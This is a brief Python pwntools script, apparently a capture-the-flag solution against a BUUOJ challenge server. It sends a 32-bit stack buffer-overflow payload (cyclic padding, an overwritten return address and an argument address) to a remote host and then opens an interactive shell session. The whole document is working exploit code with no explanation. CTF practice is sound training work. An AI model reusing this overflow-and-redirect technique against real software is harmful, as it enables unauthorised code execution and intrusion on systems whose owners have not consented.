from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29467)
elf = ELF('./pwn')
io.sendline(cyclic(24+4) + p32(0x8048529) + p32(0x8048670))
io.interactive()
